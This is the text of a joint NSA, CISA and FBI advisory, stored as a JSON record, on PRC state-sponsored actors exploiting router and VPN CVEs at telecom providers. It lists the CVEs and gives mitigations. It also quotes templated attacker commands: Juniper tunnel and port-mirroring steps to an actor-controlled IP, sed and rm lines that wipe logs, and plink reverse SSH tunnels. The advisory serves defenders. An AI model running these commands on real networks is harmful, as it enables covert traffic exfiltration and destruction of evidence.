{
    "id": "24eebd55-c8a1-4854-bb35-326195d31ce5",
    "created_at": "2022-12-27T17:06:09.442256Z",
    "updated_at": "2025-03-27T02:16:59.317657Z",
    "deleted_at": null,
    "sha1_hash": "6b79f4b71b9ded49453c3d9a0a7d8b37f30136e1",
    "title": "People's Republic of China State-Sponsored Cyber Actors Exploit Network Providers and Devices",
    "authors": "NSA, CISA, FBI",
    "file_creation_date": "2022-06-07T10:10:59Z",
    "file_modification_date": "2022-06-07T10:10:59Z",
    "file_size": 576408,
    "plain_text": "National\nSecurity\nAgency\n\nCybersecurity &\nInfrastructure\nSecurity Agency\n\nFederal Bureau\nof Investigation\n\n| Cybersecurity Advisory\n\nTLP:WHITE\n\nPeople’s Republic of China State-Sponsored Cyber\nActors Exploit Network Providers and Devices\nSummary\nThis joint Cybersecurity Advisory describes the ways in\nwhich People’s Republic of China (PRC) state-sponsored\ncyber actors continue to exploit publicly known\n\nBest Practices\n\n\nApply patches as soon\nas possible\nDisable unnecessary\nports and protocols\nReplace end-of-life\ninfrastructure\nImplement a centralized\npatch management\nsystem\n\nvulnerabilities in order to establish a broad network of\n\ncompromised infrastructure. These actors use the network\nto exploit a wide variety of targets worldwide, including\n\npublic and private sector organizations. The advisory\n\ndetails the targeting and compromise of major\ntelecommunications companies and network service\nproviders and the top vulnerabilities—primarily Common\nVulnerabilities and Exposures (CVEs)—associated with\nnetwork devices routinely exploited by the cyber actors since 2020.\n\nThis joint Cybersecurity Advisory was coauthored by the National Security Agency\n(NSA), the Cybersecurity and Infrastructure Security Agency (CISA), and the Federal\nBureau of Investigation (FBI). It builds on previous NSA, CISA, and FBI reporting to\ninform federal and state, local, tribal, and territorial (SLTT) government; critical\ninfrastructure (CI), including the Defense Industrial Base (DIB); and private sector\norganizations about notable trends and persistent tactics, techniques, and procedures\n(TTPs).\nEntities can mitigate the vulnerabilities listed in this advisory by applying the available\npatches to their systems, replacing end-of-life infrastructure, and implementing a\ncentralized patch management program.\nNSA, CISA, and the FBI urge U.S. and allied governments, CI, and private industry\norganizations to apply the recommendations listed in the Mitigations section and\n\nThis document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when\ninformation carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and\nprocedures for public release. Subject to standard copyright rules, TLP:WHITE information may be\ndistributed without restriction. For more information on the Traffic Light Protocol, see cisa.gov/tlp/.\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nAppendix A: Vulnerabilities to increase their defensive posture and reduce the risk of\nPRC state-sponsored malicious cyber actors affecting their critical networks.\nFor more information on PRC state-sponsored malicious cyber activity, see CISA’s\nChina Cyber Threat Overview and Advisories webpage.\n\nCommon vulnerabilities exploited by People’s Republic of\nChina state-sponsored cyber actors\nPRC state-sponsored cyber actors readily exploit vulnerabilities to compromise\nunpatched network devices. Network devices, such as Small Office/Home Office\n(SOHO) routers and Network Attached Storage (NAS) devices, serve as additional\naccess points to route command and control (C2) traffic and act as midpoints to conduct\nnetwork intrusions on other entities. Over the last few years, a series of high-severity\nvulnerabilities for network devices provided cyber actors with the ability to regularly\nexploit and gain access to vulnerable infrastructure devices. In addition, these devices\nare often overlooked by cyber defenders, who struggle to maintain and keep pace with\nroutine software patching of Internet-facing services and endpoint devices.\nSince 2020, PRC state-sponsored cyber actors have conducted widespread campaigns\nto rapidly exploit publicly identified security vulnerabilities, also known as common\nvulnerabilities and exposures (CVEs). This technique has allowed the actors to gain\naccess into victim accounts using publicly available exploit code against virtual private\nnetwork (VPN) services [T1133]1 or public facing applications [T1190]—without using\ntheir own distinctive or identifying malware—so long as the actors acted before victim\norganizations updated their systems.\nPRC state-sponsored cyber actors typically conduct their intrusions by accessing\ncompromised servers called hop points from numerous China-based Internet Protocol\n(IP) addresses resolving to different Chinese Internet service providers (ISPs). The\ncyber actors typically obtain the use of servers by leasing remote access directly or\nindirectly from hosting providers. They use these servers to register and access\noperational email accounts, host C2 domains, and interact with victim networks. Cyber\nactors use these hop points as an obfuscation technique when interacting with victim\nnetworks.\n\n1 T1133 and similar references are MITRE ATT&CK® tactics and techniques, version 11.2. MITRE and ATT&CK are registered trademarks of\n\nThe MITRE Corporation.\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n2\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nThese cyber actors are also consistently evolving and adapting tactics to bypass\ndefenses. NSA, CISA, and the FBI have observed state-sponsored cyber actors\nmonitoring network defenders’ accounts and actions, and then modifying their ongoing\ncampaign as needed to remain undetected. Cyber actors have modified their\ninfrastructure and toolsets immediately following the release of information related to\ntheir ongoing campaigns. PRC state-sponsored cyber actors often mix their customized\ntoolset with publicly available tools, especially by leveraging tools that are native to the\nnetwork environment, to obscure their activity by blending into the noise or normal\nactivity of a network.\nNSA, CISA, and the FBI consider the common vulnerabilities and exposures (CVEs)\nlisted in Table 1 to be the network device CVEs most frequently exploited by PRC statesponsored cyber actors since 2020.\nTable 1: Top network device CVEs exploited by PRC state-sponsored cyber actors\n\nVendor\n\nCVE\n\nVulnerability Type\n\nCVE-2018-0171\n\nRemote Code Execution (RCE)\n\nCVE-2019-15271\n\nRCE\n\nCVE-2019-1652\n\nRCE\n\nCitrix\n\nCVE-2019-19781\n\nRCE\n\nDrayTek\n\nCVE-2020-8515\n\nRCE\n\nD-Link\n\nCVE-2019-16920\n\nRCE\n\nFortinet\nMikroTik\n\nCVE-2018-13382\nCVE-2018-14847\n\nAuthentication Bypass\nAuthentication Bypass\n\nNetgear\n\nCVE-2017-6862\n\nRCE\n\nCVE-2019-11510\n\nAuthentication Bypass\n\nCVE-2021-22893\n\nRCE\n\nCVE-2019-7192\n\nPrivilege Elevation\n\nCVE-2019-7193\n\nRemote Inject\n\nCVE-2019-7194\n\nXML Routing Detour Attack\n\nCVE-2019-7195\n\nXML Routing Detour Attack\n\nCVE-2020-29583\n\nAuthentication Bypass\n\nCisco\n\nPulse\n\nQNAP\n\nZyxel\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n3\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nTelecommunications and network service provider targeting\nPRC state-sponsored cyber actors frequently utilize open-source tools for\nreconnaissance and vulnerability scanning. The actors have utilized open-source router\nspecific software frameworks, RouterSploit and RouterScan [T1595.002], to identify\nmakes, models, and known vulnerabilities for further investigation and exploitation. The\nRouterSploit Framework is an open-source exploitation framework dedicated to\nembedded devices. RouterScan is an open-source tool that easily allows for the\nscanning of IP addresses for vulnerabilities. These tools enable exploitation of SOHO\nand other routers manufactured by major industry providers, including Cisco, Fortinet,\nand MikroTik.\nUpon gaining an initial foothold into a telecommunications organization or network\nservice provider, PRC state-sponsored cyber actors have identified critical users and\ninfrastructure including systems critical to maintaining the security of authentication,\nauthorization, and accounting. After identifying a critical Remote Authentication Dial-In\nUser Service (RADIUS) server, the cyber actors gained credentials to access the\nunderlying Structured Query Language (SQL) database [T1078] and utilized SQL\ncommands to dump the credentials [T1555], which contained both cleartext and hashed\npasswords for user and administrative accounts.\nHaving gained credentials from the RADIUS server, PRC state-sponsored cyber actors\nused those credentials with custom automated scripts to authenticate to a router via\nSecure Shell (SSH), execute router commands, and save the output [T1119]. These\nscripts targeted Cisco and Juniper routers and saved the output of the executed\ncommands, including the current configuration of each router. After successfully\ncapturing the command output, these configurations were exfiltrated off network to the\nactor’s infrastructure [TA0010]. The cyber actors likely used additional scripting to\nfurther automate the exploitation of medium to large victim networks, where routers and\nswitches are numerous, to gather massive numbers of router configurations that would\nbe necessary to successfully manipulate traffic within the network.\nArmed with valid accounts and credentials from the compromised RADIUS server and\nthe router configurations, the cyber actors returned to the network and used their\naccess and knowledge to successfully authenticate and execute router commands to\nsurreptitiously route [T1599], capture [T1020.001], and exfiltrate traffic out of the\nnetwork to actor-controlled infrastructure.\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n4\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nWhile other manufacturers likely have similar commands, the cyber actors executed the\nfollowing commands on a Juniper router to perform initial tunnel configuration for\neventual exfiltration out of the network:\nset chassis fpc <slot number> pic <user defined value> tunnel-services bandwidth <user\ndefined value>\nset chassis network-services all-ethernet\nset interfaces <interface-id> unit <unit number> tunnel source <local network IP address>\nset interfaces <interface-id> unit <unit number> tunnel destination <actor controlled IP\naddress>\n\nAfter establishing the tunnel, the cyber actors configured the local interface on the\ndevice and updated the routing table to route traffic to actor-controlled infrastructure.\nset interfaces <interface-id> unit <unit number> family inet address <local network IP\naddress subnet>\nset routing-options static route <local network IP address> next-hop <actor controlled IP\naddress>\n\nPRC state-sponsored cyber actors then configured port mirroring to copy all traffic to the\nlocal interface, which was subsequently forwarded through the tunnel out of the network\nto actor-controlled infrastructure.\nset firewall family inet filter <filter name> term <filter variable> then port-mirror\nset forwarding-options port-mirroring input rate 1\nset forwarding-options port-mirroring family inet output interface <interface-id> next-hop\n<local network IP address>\nset forwarding-options port-mirroring family inet output no-filter-check\nset interfaces <interface-id> unit <unit number> family inet filter input <filter name>\nset interfaces <interface-id> unit <unit number> family inet filter output <filter name>\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n5\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nHaving completed their configuration changes, the cyber actors often modified and/or\nremoved local log files to destroy evidence of their activity to further obfuscate their\npresence and evade detection.\nsed -i -e '/<REGEX>/d' <log filepath 1>\nsed -i -e '/<REGEX>/d' <log filepath 2>\nsed -i -e '/<REGEX>/d' <log filepath 3>\nrm -f <log filepath 4>\nrm -f <log filepath 5>\nrm -f <log filepath 6>\n\nPRC state-sponsored cyber actors also utilized command line utility programs like\nPuTTY Link (Plink) to establish SSH tunnels [T1572] between internal hosts and leased\nvirtual private server (VPS) infrastructure. These actors often conducted system\nnetwork configuration discovery [T1016.001] on these host networks by sending\nhypertext transfer protocol (HTTP) requests to C2 infrastructure in order to illuminate\nthe external public IP address.\nplink.exe –N –R <local port>:<host 1>:<remote port> -pw <user defined password> -batch\nroot@<VPS1> -P <remote SSH port>\nplink.exe –N –R <local port>:<host 2>:<remote port> -pw <user defined password> -batch\nroot@<VPS2> -P <remote SSH port>\n\nMitigations\nNSA, CISA, and the FBI urge organizations to apply the following recommendations as\nwell as the mitigation and detection recommendations in Appendix A, which are tailored\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n6\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nto observed tactics and techniques. While some vulnerabilities have specific additional\nmitigations below, the following mitigations generally apply:\n\n\nKeep systems and products updated and patched as soon as possible after\npatches are released [D3-SU]2. Consider leveraging a centralized patch\nmanagement system to automate and expedite the process.\n\n\n\nImmediately remove or isolate suspected compromised devices from the network\n[D3-ITF] [D3-OTF].\n\n\n\nSegment networks to limit or block lateral movement [D3-NI].\n\n\n\nDisable unused or unnecessary network services, ports, protocols, and devices\n[D3-ACH] [D3-ITF] [D3-OTF].\n\n\n\nEnforce multifactor authentication (MFA) for all users, without exception [D3MFA].\n\n\n\nEnforce MFA on all VPN connections [D3-MFA]. If MFA is unavailable, enforce\npassword complexity requirements [D3-SPP].\n\n\n\nImplement strict password requirements, enforcing password complexity,\nchanging passwords at a defined frequency, and performing regular account\nreviews to ensure compliance [D3-SPP].\n\n\n\nPerform regular data backup procedures and maintain up-to-date incident\nresponse and recovery procedures.\n\n\n\nDisable external management capabilities and set up an out-of-band\nmanagement network [D3-NI].\n\n\n\nIsolate Internet-facing services in a network Demilitarized Zone (DMZ) to reduce\nthe exposure of the internal network [D3-NI].\n\n\n\nEnable robust logging of Internet-facing services and monitor the logs for signs of\ncompromise [D3-NTA] [D3-PM].\n\n\n\nEnsure that you have dedicated management systems [D3-PH] and accounts for\nsystem administrators. Protect these accounts with strict network policies [D3UAP].\n\n\n\nEnable robust logging and review of network infrastructure accesses,\nconfiguration changes, and critical infrastructure services performing\nauthentication, authorization, and accounting functions [D3-PM].\n\n2 D3-SU and similar references are MITRE D3FEND® countermeasures. MITRE and D3FEND are registered trademarks of The MITRE\n\nCorporation.\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n7\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\n\n\nUpon responding to a confirmed incident within any portion of a network,\nresponse teams should scrutinize network infrastructure accesses, evaluate\npotential lateral movement to network infrastructure and implement corrective\nactions commensurate with their findings.\n\nResources\nRefer to us-cert.cisa.gov/china, https://www.ic3.gov/Home/IndustryAlerts, and\nhttps://www.nsa.gov/cybersecurity-guidance for previous reporting on People’s Republic\nof China state-sponsored malicious cyber activity.\nU.S. government and critical infrastructure organizations, should consider signing up for\nCISA’s cyber hygiene services, including vulnerability scanning, to help reduce\nexposure to threats.\nU.S. Defense Industrial Base (DIB) organizations, should consider signing up for the\nNSA Cybersecurity Collaboration Center’s DIB Cybersecurity Service Offerings,\nincluding Protective Domain Name System (PDNS) services, vulnerability scanning, and\nthreat intelligence collaboration. For more information on eligibility criteria and how to\nenroll in these services, email dib_defense@cyber.nsa.gov.\n\nAdditional References\n\n\n\n\n\n\n\n\n\n\n\n\nCISA (2022), Weak Security Controls and Practices Routinely Exploited for Initial\nAccess. https://www.cisa.gov/uscert/ncas/alerts/aa22-137a\nCISA (2022) 2021 Top Routinely Exploited Vulnerabilities.\nhttps://www.cisa.gov/uscert/ncas/alerts/aa22-117a\nNSA (2021), Selecting and Hardening Remote Access VPN Solutions.\nhttps://media.defense.gov/2021/Sep/28/2002863184/-1/-1/0/CSI_SELECTINGHARDENING-REMOTE-ACCESS-VPNS-20210928.PDF\nNSA (2021), Chinese State-Sponsored Cyber Operations: Observed TTPs.\nhttps://media.defense.gov/2021/Jul/19/2002805003/-1/1/0/CSA_CHINESE_STATE-SPONSORED_CYBER_TTPS.PDF\nCISA (2021), Exploitation of Pulse Connect Secure Vulnerabilities.\nhttps://www.cisa.gov/uscert/ncas/alerts/aa21-110a\nNSA (2020), Chinese State-Sponsored Actors Exploit Publicly Known\nVulnerabilities. https://media.defense.gov/2020/Oct/20/2002519884/-1/1/0/CSA_CHINESE_EXPLOIT_VULNERABILITIES_UOO179811.PDF\nCISA (2020), Chinese Ministry of State Security-Affiliated Cyber Threat Actor\nActivity. https://www.cisa.gov/uscert/ncas/alerts/aa20-258a\nNSA (2020), Performing Out-of-Band Network Management.\nhttps://media.defense.gov/2020/Sep/17/2002499616/-1/1/0/PERFORMING_OUT_OF_BAND_NETWORK_MANAGEMENT20200911.PD\nF\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n8\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\n\n\n\n\n\n\nCISA (2020), Critical Vulnerability in Citrix Application Delivery Controller,\nGateway, and SD-WAN WANOP. https://www.cisa.gov/uscert/ncas/alerts/aa20020a\nNSA (2019), Mitigating Recent VPN Vulnerabilities.\nhttps://media.defense.gov/2019/Oct/07/2002191601/-1/1/0/Mitigating%20Recent%20VPN%20Vulnerabilities%20-%20Copy.pdf\nNSA (2019), Update and Upgrade Software Immediately.\nhttps://media.defense.gov/2019/Sep/09/2002180319/-1/1/0/Update%20and%20Upgrade%20Software%20Immediately.docx%20%20Copy.pdf\n\nContact Information\nTo report incidents and anomalous activity or to request incident response resources or\ntechnical assistance related to these threats, contact CISA at report@cisa.gov. To\nreport computer intrusion or cybercrime activity related to information found in this\nadvisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s\n24/7 Cyber Watch at 855-292-3937 or by email at CyWatch@fbi.gov. For NSA client\nrequirements or general cybersecurity inquiries, contact\nCybersecurity_Requests@nsa.gov.\nMedia Inquiries / Press Desk:\n NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov\n CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov\n FBI National Press Office, 202-324-3691, npo@fbi.gov\n\nDisclaimer of endorsement\nThe information and opinions contained in this document are provided \"as is\" and\nwithout any warranties or guarantees. Reference herein to any specific commercial\nproducts, process, or service by trade name, trademark, manufacturer, or otherwise,\ndoes not constitute or imply its endorsement, recommendation, or favoring by the\nUnited States Government, and this guidance shall not be used for advertising or\nproduct endorsement purposes.\n\nPurpose\nThis advisory was developed by NSA, CISA, and the FBI in furtherance of their\nrespective cybersecurity missions, including their responsibilities to develop and issue\ncybersecurity specifications and mitigations. This information may be shared broadly to\nreach all appropriate stakeholders.\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n9\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nAppendix A: Vulnerabilities\nTable 2: Information on Cisco CVE-2018-0171\n\nCisco CVE-2018-0171\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nA vulnerability in the Smart Install feature of Cisco IOS Software and Cisco IOS XE Software could\nallow an unauthenticated, remote attacker to trigger a reload of an affected device, resulting in a denial\nof service (DoS) condition, or to execute arbitrary code on an affected device. The vulnerability is due\nto improper validation of packet data. An attacker could exploit this vulnerability by sending a crafted\nSmart Install message to an affected device on TCP port 4786. A successful exploit could allow the\nattacker to cause a buffer overflow on the affected device, which could have the following impacts:\nTriggering a reload of the device, Allowing the attacker to execute arbitrary code on the device, causing\nan indefinite loop on the affected device that triggers a watchdog crash.\nRecommended Mitigations\n• Cisco has released software updates that address this vulnerability.\n• In addition, the Cisco Smart Install feature is highly recommended to be disabled to reduce\nexposure.\nDetection Methods\n• CISCO IOS Software Checker\nVulnerable Technologies and Versions\nThe vulnerability affects Cisco devices that are running a vulnerable release of Cisco IOS or IOS XE\nsoftware and have the smart install client feature enabled. Only smart install client switches are\naffected by this vulnerability described in this advisory.\nReferences\nhttp://www.securityfocus.com/bid/103538\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180328-smi2\nhttps://ics-cert.us-cert.gov/advisories/ICSA-18-107-04\nhttps://ics-cert.us-cert.gov/advisories/ICSA-18-107-05\nhttps://www.darkreading.com/perimeter/attackers-exploit-cisco-switch-issue-as-vendor-warns-of-yetanother-critical-flaw/d/d-id/1331490\nhttp://www.securitytracker.com/id/1040580\nTable 3: Information on Cisco CVE-2019-15271\n\nCisco CVE-2019-15271\n\nCVSS 3.0: 8.8 (High)\n\nVulnerability Description\nA vulnerability in the web-based management interface of certain Cisco Small Business RV Series\nRouters could allow an authenticated, remote attacker to execute arbitrary commands with root\nprivileges. The attacker must have either a valid credential or an active session token. The vulnerability\nis due to lack of input validation of the HTTP payload. An attacker could exploit this vulnerability by\nsending a malicious HTTP request to the web-based management interface of the targeted device. A\nsuccessful exploit could allow the attacker to execute commands with root privileges.\nRecommended Mitigations\n• Cisco has released free software updates that address the vulnerability described in this advisory.\n• Cisco fixed this vulnerability in firmware releases 4.2.3.10 and later for the Cisco RV042 Dual WAN\nVPN Router and RV042G Dual Gigabit WAN VPN Router.\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n10\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\n• Administrators can reduce the attack surface by disabling the Remote Management feature if there\nis no operational requirement to use it. Note that the feature is disabled by default.\nDetection Methods\n• N/A\nVulnerable Technologies and Versions\nThis vulnerability affects the following Cisco Small Business RV Series Routers if they are running a\nfirmware release earlier than 4.2.3.10:\n RV016 Multi-WAN VPN Router\n RV042 Dual WAN VPN Router\n RV042G Dual Gigabit WAN VPN Router\n RV082 Dual WAN VPN Router\nReferences\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20191106-sbrv-cmd-x\nTable 4: Information on Cisco CVE-2019-1652\n\nCisco CVE-2019-1652\n\nCVSS 3.0: 7.2 (High)\n\nVulnerability Description\nA vulnerability in the web-based management interface of Cisco Small Business RV320 and RV325\nDual Gigabit WAN VPN Routers could allow an authenticated, remote attacker with administrative\nprivileges on an affected device to execute arbitrary commands. The vulnerability is due to improper\nvalidation of user-supplied input. An attacker could exploit this vulnerability by sending malicious HTTP\nPOST requests to the web-based management interface of an affected device. A successful exploit\ncould allow the attacker to execute arbitrary commands on the underlying Linux shell as root. Cisco has\nreleased firmware updates that address this vulnerability.\nRecommended Mitigations\n• Cisco has released free software updates that address the vulnerability described in this advisory\n• This vulnerability is fixed in RV320 and RV325 Dual Gigabit WAN VPN Routers Firmware Release\n1.4.2.22 and later.\n• If the Remote Management feature is enabled, Cisco recommends disabling it to reduce exposure.\nDetection Methods\n• N/A\nVulnerable Technologies and Versions\nThis vulnerability affects Cisco Small Business RV320 and RV325 Dual Gigabit WAN VPN Routers\nrunning firmware releases 1.4.2.15 through 1.4.2.20.\nReferences\nhttp://www.securityfocus.com/bid/106728\nhttps://seclists.org/bugtraq/2019/Mar/55\nhttps://www.exploit-db.com/exploits/46243/\nhttps://www.exploit-db.com/exploits/46655/\nhttp://seclists.org/fulldisclosure/2019/Mar/61\nhttp://packetstormsecurity.com/files/152262/Cisco-RV320-Command-Injection.html\nhttp://packetstormsecurity.com/files/152305/Cisco-RV320-RV325-Unauthenticated-Remote-CodeExecution.html\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject\nTable 5: Information on Citrix CVE-2019-19781\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n11\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nCitrix CVE-2019-19781\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nAn issue was discovered in Citrix Application Delivery Controller (ADC) and Gateway 10.5, 11.1, 12.0,\n12.1, and 13.0. They allow Directory Traversal.\nRecommended Mitigations\n• Implement the appropriate refresh according to the vulnerability details outlined by vendor: Citrix:\nMitigation Steps for CVE-2019-19781.\n• If possible, only allow the VPN to communicate with known Internet Protocol (IP) addresses (allowlist).\nDetection Methods\n• CISA has developed a free detection tool for this vulnerability: cisa.gov/check-cve-2019-19781:\nTest a host for susceptibility to CVE-2019-19781.\n• Nmap developed a script that can be used with the port scanning engine: CVE-2019-19781 – Critix\nADC Path Traversal #1893.\n• Citrix also developed a free tool for detecting compromises of Citrix ADC Appliances related to\nCVE-2019-19781: Citrix / CVE-2019-19781: IOC Scanner for CVE-2019-19781.\n• CVE-2019-19781 is commonly exploited to install web shell malware. The National Security\nAgency (NSA) provides guidance on detecting and preventing web shell malware at\nhttps://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEBSHELL-MALWARE-20200422.PDF and signatures at https://github.com/nsacyber/Mitigating-WebShells.\nVulnerable Technologies and Versions\nThe vulnerability affects the following Citrix product versions on all supported platforms:\n Citrix ADC and Citrix Gateway version 13.0 all supported builds before 13.0.47.24\n NetScaler ADC and NetScaler Gateway version 12.1 all supported builds before 12.1.55.18\n NetScaler ADC and NetScaler Gateway version 12.0 all supported builds before 12.0.63.13\n NetScaler ADC and NetScaler Gateway version 11.1 all supported builds before 11.1.63.15\n NetScaler ADC and NetScaler Gateway version 10.5 all supported builds before 10.5.70.12\n Citrix SD-WAN WANOP appliance models 4000-WO, 4100-WO, 5000-WO, and 5100-WO all\nsupported software release builds before 10.2.6b and 11.0.3b\nReferences\nhttps://support.citrix.com/article/CTX267027\n\nTable 6: Information on DrayTek CVE-2020-8515\n\nDrayTek CVE-2020-8515\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nDrayTek Vigor2960 1.3.1_Beta, Vigor3900 1.4.4_Beta, and Vigor300B 1.3.3_Beta, 1.4.2.1_Beta, and\n1.4.4_Beta devices allow remote code execution as root (without authentication) via shell\nmetacharacters to the cgi-bin/mainfunction.cgi URI. This issue has been fixed in Vigor3900/2960/300B\nv1.5.1.\nRecommended Mitigations\n• Users of affected models should upgrade to 1.5.1 firmware or later as soon as possible, the\nupdated firmware addresses this issue.\n• Disable the remote access on your router if you don’t need it.\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n12\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\n• Disable remote access (admin) and SSL VPN. The ACL does not apply to SSL VPN connections\n(Port 443) so you should also temporarily disable SSL VPN until you have updated the firmware.\n• Always back up your config before doing an upgrade.\n• After upgrading, check that the web interface now shows the new firmware version.\n• Enable syslog logging for monitoring if there are abnormal events.\nDetection Methods\n• Check that no additional remote access profiles (VPN dial-in, teleworker or LAN to LAN) or admin\nusers (for router admin) have been added.\n• Check if any ACL (Access Control Lists) have been altered.\nVulnerable Technologies and Versions\n• This vulnerability affects the Vigor3900/2960/300B before firmware version 1.5.1.\nReferences\nhttps://draytek.com/about/security-advisory/vigor3900-/-vigor2960-/-vigor300b-router-webmanagement-page-vulnerability-(cve-2020-8515)/\nhttp://packetstormsecurity.com/files/156979/DrayTek-Vigor2960-Vigor3900-Vigor300B-RemoteCommand-Execution.html\nhttps://sku11army.blogspot.com/2020/01/draytek-unauthenticated-rce-in-draytek.html\nTable 7: Information on D-Link CVE-2019-16920\n\nD-Link CVE-2019-16920\n\nCVSS 3.0: 9.8 (Critical)\n\nVulnerability Description\nUnauthenticated remote code execution occurs in D-Link products such as DIR-655C, DIR-866L, DIR652, and DHP-1565. The issue occurs when the attacker sends an arbitrary input to a \"PingTest\"\ndevice common gateway interface that could lead to common injection. An attacker who successfully\ntriggers the command injection could achieve full system compromise. Later, it was independently\nfound that these are also affected: DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR-835, and DIR-825.\nRecommended Mitigations\n• Recommendation is to replace affected devices with ones that are currently supported by the\nvendor. End-of-life devices should not be used.\nDetection Methods\n• HTTP packet inspection to look for arbitrary input to the “ping_test” command\nVulnerable Technologies and Versions\n• DIR DIR-655C, DIR-866L, DIR-652, DHP-1565, DIR-855L, DAP-1533, DIR-862L, DIR-615, DIR835, and DIR-82\nReferences\nhttps://www.kb.cert.org/vuls/id/766427\nhttps://fortiguard.com/zeroday/FG-VD-19-117\nhttps://medium.com/@80vul/determine-the-device-model-affected-by-cve-2019-16920-by-zoomeyebf6fec7f9bb3\nhttps://www.seebug.org/vuldb/ssvid-98079\nTable 8: Information on Fortinet CVE-2018-13382\n\nFortinet CVE-2018-13382\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\nCVSS 3.0: 7.5 (High)\n\n13\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\nVulnerability Description\nAn Improper Authorization vulnerability in Fortinet FortiOS 6.0.0 to 6.0.4, 5.6.0 to 5.6.8 and 5.4.1 to\n5.4.10 and FortiProxy 2.0.0, 1.2.0 to 1.2.8, 1.1.0 to 1.1.6, 1.0.0 to 1.0.7 under SSL VPN web portal\nallows an unauthenticated attacker to modify the password of an SSL VPN web portal user via specially\ncrafted HTTP requests.\nRecommended Mitigations\n• Upgrade to FortiOS versions 5.4.11, 5.6.9, 6.0.5, 6.2.0 or above and/or upgrade to FortiProxy\nversion 1.2.9 or above or version 2.0.1 or above.\n• SSL VPN users with local authentication can mitigate the impact by enabling Two-Factor\nAuthentication (2FA).\n• Migrate SSL VPN user authentication from local to remote (LDAP or RADIUS).\n• Totally disable the SSL-VPN service (both web-mode and tunnel-mode) by applying the following\nCLI commands: config vpn ssl settings, unset source-interface, end.\nDetection Methods\n• HTTP packet inspection to look for specially crafted packets containing the magic key for the SSL\nVPN password modification\nVulnerable Technologies and Versions\nThis vulnerability affects the following products:\n Fortinet FortiOS 6.0.0 to 6.0.4\n Fortinet FortiOS 5.6.0 to 5.6.8\n Fortinet FortiOS 5.4.1 to 5.4.10\n Fortinet FortiProxy 2.0.0\n Fortinet FortiProxy 1.2.8 and below\n Fortinet FortiProxy 1.1.6 and below\n Fortinet FortiProxy 1.0.7 and below\nFortiOS products are vulnerable only if the SSL VPN service (web-mode or tunnel-mode) is enabled\nand users with local authentication.\nReferences\nhttps://fortiguard.com/psirt/FG-IR-18-389\nhttps://fortiguard.com/advisory/FG-IR-18-389\nhttps://www.fortiguard.com/psirt/FG-IR-20-231\nTable 9: Information on Mikrotik CVE-2018-14847\n\nMikrotik CVE-2018-14847\n\nCVSS 3.0: 9.1 (Critical)\n\nVulnerability Description\nMikroTik RouterOS through 6.42 allows unauthenticated remote attackers to read arbitrary files and\nremote authenticated attackers to write arbitrary files due to a directory traversal vulnerability in the\nWinBox interface.\nRecommended Mitigations\n• Upgrade WinBox and RouterOS and change passwords\n• Firewall the WinBox port from the public interface and from untrusted networks\nDetection Methods\n• Use export command to see all your configuration and inspect for any abnormalities, such as\nunknown SOCKS proxy settings and scripts.\nVulnerable Technologies and Versions\nThis vulnerability affected the following MikroTik products:\n\nU/OO/160405-22 | PP-22- 0825 | JUN 2022 Ver 1.0\n\n14\n\nTLP:WHITE\n\nNSA, CISA, & FBI | PRC State-Sponsored Actors Exploit Network Providers, Devices\n\n\n\n\nAll bugfix releases from 6.30.1 to 6.40.7\nAll current releases from 6.29 to 6.42\n All RC releases from 6.29rc1 to 